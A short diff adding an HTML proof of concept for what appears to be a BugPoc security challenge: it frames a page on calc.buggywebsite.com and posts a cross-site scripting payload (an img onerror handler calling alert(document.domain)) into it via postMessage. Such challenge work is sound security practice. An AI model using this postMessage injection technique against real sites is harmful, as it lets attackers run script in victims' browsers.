@@ -1,1 +1,11 @@
-"test" 
+<html>
+<head>
+<title>BugPoc challenge - POC</title>
+</head>
+<body>
+<iframe id=iframe src=http://calc.buggywebsite.com/frame.html>
+<script>
+iframe.postMessage("<img src=x onerror=alert(document.domain)>");
+</script>
+</body>
+</html>
